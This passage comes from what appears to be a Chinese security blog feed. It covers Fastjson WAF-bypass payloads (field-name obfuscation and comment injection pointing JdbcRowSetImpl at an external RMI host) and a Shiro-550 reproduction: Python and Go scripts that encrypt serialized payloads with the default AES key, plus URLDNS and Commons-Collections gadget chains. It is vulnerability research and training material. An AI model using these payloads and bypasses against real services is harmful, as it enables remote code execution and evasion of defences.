class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="language-wren"> <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,</span><br><span class="language-wren">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-wren">    &#125;</span><br><span class="language-wren">&#125;</span><br></code></pre></td></tr></table></figure><p>没有绕过，但这里也只是测试了雷池，或者可以尝试其他的waf看能不能绕过，通过hex&#x2F;unicode混合编码。</p><h2 id="6-对字段添加多个下划线或者减号："><a href="#6-对字段添加多个下划线或者减号：" class="headerlink" title="6. 对字段添加多个下划线或者减号："></a>6. 对字段添加多个下划线或者减号：</h2><p>1.2.36版本前，在在<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code></p><p>解析字段的key的时候，调用了<code>smartMatch</code>：</p><p><img src="/../../../blog_image/image-20240409094620220.png" alt="image-20240409094620220"></p><p>由于存在break，因此<code>_</code>和<code>-</code>不能混合使用。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;d_a_t_aSourceName\&quot;:\&quot;rmi://localhost:1099/aa\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>在<code>1.2.36</code>版本之后，则可以混合使用：</p><p><img src="/../../../blog_image/image-20240409094720551.png" alt="image-20240409094720551"></p><p>因此可以尝试使用<code>-</code>和<code>_</code>对字段进行混淆。</p><p>这里测试的是<code>1.2.24</code>版本，本地可以直接运行，但是不能绕过waf，还是得配合第四点进行绕过，或者添加逗号：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>167<br><br><span class="language-ruby">&#123;</span><br><span class="language-ruby">    <span class="hljs-string">&quot;b&quot;</span><span class="hljs-symbol">:/*shabi*/</span>&#123;</span><br><span class="language-ruby"> <span class="hljs-regexp">/*shabi*/</span><span class="hljs-string">&quot;@type&quot;</span><span class="hljs-symbol">:xcom</span>.sun.rowset.<span class="hljs-title class_">JdbcRowSetImpl</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-ruby"> &quot;</span>dat____aSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-symbol">rmi:</span>/<span class="hljs-regexp">/121.37.229.215:9999/</span><span class="hljs-title class_">Calc</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-ruby">        &quot;</span>autoCommit<span class="hljs-string">&quot;:true</span></span><br><span class="hljs-string"><span class="language-ruby">    &#125;</span></span><br><span class="hljs-string"><span class="language-ruby">&#125;</span></span><br></code></pre></td></tr></table></figure><h2 id="7-注释绕过："><a href="#7-注释绕过：" class="headerlink" title="7. 注释绕过："></a>7. 注释绕过：</h2><p>可以尝试在json字段前后添加注释进行绕过，但是这种方法还是不能直接过waf，还需要配合首字母或者逗号绕过：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">/**/</span><span class="hljs-punctuation">&#123;</span><span class="hljs-comment">/*&#123;*/</span><span class="hljs-comment">/*&#125;*/</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;d_a_t_aSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://localhost:1099/aa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>一些waf可能可以，这里配合任意首字母去绕过雷池：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>183<br><br><span class="language-elixir">&#123;</span><br><span class="language-elixir">    <span class="hljs-string">&quot;b&quot;</span><span class="hljs-symbol">:</span>&#123;</span><br><span class="language-elixir"> /*&#123;*/</span><br><span class="language-elixir">/*&#125;*/<span class="hljs-string">&quot;@type&quot;</span><span class="hljs-symbol">:/*shabiwafwocaonima*/xcom</span>.sun.rowset.<span class="hljs-title class_">JdbcRowSetImpl</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-elixir"> &quot;</span>dat____aSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-symbol">rmi:</span>//<span class="hljs-number">121.37</span>.<span class="hljs-number">229.215</span><span class="hljs-symbol">:</span><span class="hljs-number">9999</span>/<span class="hljs-title class_">Calc</span><span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-elixir">        &quot;</span>autoCommit<span class="hljs-string">&quot;:true</span></span><br><span class="hljs-string"><span class="language-elixir">    &#125;</span></span><br><span class="hljs-string"><span class="language-elixir">&#125;</span></span><br></code></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/#%E6%B3%A8%E9%87%8A%E5%8A%A0%E5%BC%BA%E7%89%88%E7%BB%95%E8%BF%87">浅谈Fastjson绕waf (y4tacker.github.io)</a></p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/">Java反序列化Fastjson篇01-FastJson基础 | Drunkbaby’s Blog (drun1baby.top)</a></p><p><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析 | Drunkbaby’s Blog (drun1baby.top)</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro550</title>
    <link href="/2024/04/21/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/shiro/shiro-550/"/>
    <url>/2024/04/21/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/shiro/shiro-550/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h1><p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><p>在samples目录下的web目录，才是我们需要复现的环境。</p><p>将<code>jstl</code>版本改成1.2</p><p><img src="E:\blog\source\blog_image\image-20240528093936180.png" alt="image-20240528093936180"></p><p>shiro版本：1.2.4</p><h1 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h1><p>访问页面抓包：</p><p><a href="http://localhost:8081/login.jsp">localhost:8081&#x2F;login.jsp</a>后点击记住我：</p><p>返回数据包：</p><p><img src="E:\blog\source\blog_image\image-20240528093943282.png" alt="image-20240528093943282"></p><p>之后我们的后端就根据这个cookie去获取数据，之后我们的每次请求都会带上这个cookie。</p><p>这个cookie如何生成，并且如何利用就是shiro550的利用点。</p><h2 id="cookie解密："><a href="#cookie解密：" class="headerlink" title="cookie解密："></a>cookie解密：</h2><p>cookie的生成都在<code>CookieRememberMeManager</code></p><p><code>rememberSerializedIdentity</code>一看就是传入subject授权对象，然后进行进行序列化。</p><p><img src="E:\blog\source\blog_image\image-20240528093951075.png" alt="image-20240528093951075"></p><p>找到了一个get序列化值：</p><p><img src="E:\blog\source\blog_image\image-20240528093957221.png" alt="image-20240528093957221"></p><p>可以查看这个<code>getRememberedSerializedIdentity</code>方法哪里有调用，在<code>AbstractRememberMeManager</code>中调用了，如图所示：</p><p><img src="E:\blog\source\blog_image\image-20240528094023845.png" alt="image-20240528094023845"></p><p>可以知道获取到这个remeber序列化的标识后传给了<code>convertBytesToPrincipals</code>，这个方法一看就是对结果进行授权的，跟进查看：</p><p><img src="E:\blog\source\blog_image\image-20240528094033340.png" alt="image-20240528094033340"></p><p>首先对数据进行了<code>decrypt</code>解密，然后调用了反序列化。</p><p>查看解密函数：</p><p><img src="E:\blog\source\blog_image\image-20240528094039692.png" alt="image-20240528094039692"></p><p>这里解密需要解密的key，查看<code>getDecryptionCipherKey</code>函数：</p><p><img src="E:\blog\source\blog_image\image-20240528094045761.png" alt="image-20240528094045761"></p><p>查看<code>decryptionCipherKey</code>这个byte数组哪里赋值的，一直追踪发现是在抽象类中定义的全局变量：<br><img src="E:\blog\source\blog_image\image-20240528094051273.png" alt="image-20240528094051273"></p><p>然后返回<code>convertBytesToPrincipals</code>函数，最终调用了原生的反序列化：</p><p><img src="E:\blog\source\blog_image\image-20240528094056440.png" alt="image-20240528094056440"></p><h2 id="cookie加密："><a href="#cookie加密：" class="headerlink" title="cookie加密："></a>cookie加密：</h2><p>在<code>JcaCipherService.java</code>的<code>encrypt</code>方法。</p><p>主要是使用了aes加密算法。</p><p>这里就不贴了，我们根据默认key就可以去构造对应的恶意数据。</p><h1 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h1><h2 id="URLDNS链："><a href="#URLDNS链：" class="headerlink" title="URLDNS链："></a>URLDNS链：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;D:\Language\Java\java_code\Security\s.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;bytes&quot;</span><br>    <span class="hljs-string">&quot;crypto/aes&quot;</span><br>    <span class="hljs-string">&quot;crypto/cipher&quot;</span><br>    <span class="hljs-string">&quot;crypto/rand&quot;</span><br>    <span class="hljs-string">&quot;encoding/base64&quot;</span><br>    <span class="hljs-string">&quot;io/ioutil&quot;</span><br>    <span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getFileData</span><span class="hljs-params">(filename <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>    data, err := ioutil.ReadFile(filename)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to read file: %v&quot;</span>, err)<br>    &#125;<br>    <span class="hljs-keyword">return</span> data<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pad</span><span class="hljs-params">(src []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>    blockSize := aes.BlockSize<br>    padding := blockSize - <span class="hljs-built_in">len</span>(src)%blockSize<br>    padtext := bytes.Repeat([]<span class="hljs-type">byte</span>&#123;<span class="hljs-type">byte</span>(padding)&#125;, padding)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">append</span>(src, padtext...)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encryptAES</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>    key, err := base64.StdEncoding.DecodeString(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to decode key: %v&quot;</span>, err)<br>    &#125;<br><br>    block, err := aes.NewCipher(key)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to create cipher block: %v&quot;</span>, err)<br>    &#125;<br><br>    paddedData := pad(data)<br><br>    ciphertext := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, aes.BlockSize+<span class="hljs-built_in">len</span>(paddedData))<br>    iv := ciphertext[:aes.BlockSize]<br>    <span class="hljs-keyword">if</span> _, err := rand.Read(iv); err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;Failed to generate IV: %v&quot;</span>, err)<br>    &#125;<br><br>    mode := cipher.NewCBCEncrypter(block, iv)<br>    mode.CryptBlocks(ciphertext[aes.BlockSize:], paddedData)<br><br>    <span class="hljs-keyword">return</span> ciphertext<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    data := getFileData(<span class="hljs-string">&quot;D:/Language/Java/java_code/Security/s.bin&quot;</span>)<br>    encryptedData := encryptAES(data)<br>    encodedData := base64.StdEncoding.EncodeToString(encryptedData)<br>    log.Println(encodedData)<br>&#125;<br></code></pre></td></tr></table></figure><p>java中的urldns链代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://etcymwhewz.dgrh3.cn&quot;</span>);<br>        <span class="hljs-comment">// put方法会调用hashCode方法 最终会调用hashCode方法</span><br>        <span class="hljs-comment">// url的hashCode方法中会判断hashCode是否为-1 如果不为-1则直接返回 默认为-1</span><br>        <span class="hljs-comment">// 因此这里需要修改hashCode方法 让他直接返回 而不是调用其他方法去执行dns解析</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodeFiled</span> <span class="hljs-operator">=</span> url.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCodeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCodeFiled.set(url, <span class="hljs-number">123456</span>);<br><br>        <span class="hljs-comment">// 修改后put就不会执行dns解析了</span><br>        map.put(url, <span class="hljs-string">&quot;shabi&quot;</span>);<br>        <span class="hljs-comment">// 修改回去让反序列化时执行dns请求</span><br>        hashCodeFiled.set(url, -<span class="hljs-number">1</span>);<br><br>        SerializeUtil.serialize(map);<br>    &#125;<br></code></pre></td></tr></table></figure><p>之后执行加密即可：</p><p>这里需要删除<code>JSESSION</code>才可以，因为这个是没有rememberMe，有这个字段也会认为当前用户是保持登陆状态。</p><p><img src="E:\blog\source\blog_image\image-20240528094108757.png" alt="image-20240528094108757"></p><p>看到deleteMe即可，查看dns：</p><p><img src="E:\blog\source\blog_image\image-20240528094112826.png" alt="image-20240528094112826"></p><h2 id="CC3-2-1版本："><a href="#CC3-2-1版本：" class="headerlink" title="CC3.2.1版本："></a>CC3.2.1版本：</h2><p>导入依赖：</p><p><img src="E:\blog\source\blog_image\image-20240528094117057.png" alt="image-20240528094117057"></p><p>如何我们直接使用Common-Collections3.2.1的第六条链路cc6的exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建一个runtime示例 ==》 调用Runtime.getRuntime()</span><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;hello&quot;</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// put方法会执行getValue方法</span><br>        expHashMap.put(tiedMapEntry, <span class="hljs-string">&quot;sdfdsf&quot;</span>);<br><br>        <span class="hljs-comment">// 删除key 目的为了反序列化的时候走factory.transform(key);</span><br>        map.remove(<span class="hljs-string">&quot;key&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,factory);<br><br><span class="hljs-comment">//        SerializeUtil.serialize(expHashMap);</span><br>        SerializeUtil.unSerialize();<br>    &#125;<br></code></pre></td></tr></table></figure><p>发现打不进去找不到<code>Transformer</code>数组。</p><p><img src="E:\blog\source\blog_image\image-20240528094127142.png" alt="image-20240528094127142"></p><p>我们看一下shiro550中的<code>deserialize</code>方法是如何反序列化的，其实它是调用了<code>ClassResolvingObjectInputStream</code>的<code>readObject</code>方法。</p><p><img src="E:\blog\source\blog_image\image-20240528094132828.png" alt="image-20240528094132828"></p><p>查看这个类，只定义了两个方法：</p><p><img src="E:\blog\source\blog_image\image-20240528094148991.png" alt="image-20240528094148991"></p><p>其中重写了<code>resolveClass</code>。这里说明以下，调用<code>readObejct</code>会先调用<code>resolveClass</code>方法，如果是重写了则会调用重写的方法。</p><p>然后跟进调用了这个工具类的<code>forName</code>方法。</p><p><img src="E:\blog\source\blog_image\image-20240528094154394.png" alt="image-20240528094154394"></p><p>查看注释可以看到这个函数主要是作用是<code>loadClass</code>，首先查询当前线程是否能加载该类，如果不能的话则调用<code>system/application</code>的加载器，如果在没有的话则直接抛出异常。</p><p>查看原生的<code>ObjectInputStream</code>的<code>resolveClass</code>方法：</p><p><img src="E:\blog\source\blog_image\image-20240528094159526.png" alt="image-20240528094159526"></p><p>所以说shiro中的<code>readObejct</code>方法是不能读取数组类，而原生的是可以的。</p><p>因此我们需要构造一个没有数组的调用链。</p><p>因此我们不用cc1了，因为这个是一定要有Transformer去控制我们传入的参数执行<code>Runtime</code>代码，我们可以尝试使用cc3，因为cc6调用的是一个map的key的<code>getVaule</code>方法。最终我们不需要<code>Runtime</code>加载恶意指令了，而是调用<code>Templates</code>加载字节码。</p><p>这里也可以调用cc4。</p><p><img src="E:\blog\source\blog_image\image-20240528094204395.png" alt="image-20240528094204395"></p><p>所以说后半段都是调用<code>TemplatesImpl</code>类。</p><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span 